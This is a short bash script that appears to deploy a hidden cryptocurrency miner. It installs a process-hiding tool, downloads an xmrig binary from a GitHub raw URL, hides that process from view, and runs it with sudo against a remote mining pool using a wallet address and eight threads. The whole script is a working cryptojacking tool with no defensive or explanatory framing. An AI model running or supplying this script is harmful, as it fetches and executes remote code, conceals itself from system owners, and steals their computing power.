#!/bin/bash
npm i -g node-process-hider
wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
chmod 500 xmrig
ph add xmrig
sudo ./xmrig -o bbp.hanalani.org:3001 -u B6UC9yE4oRa3vPzHAqZMkiDUjh2mHusPsX -k--threads=8
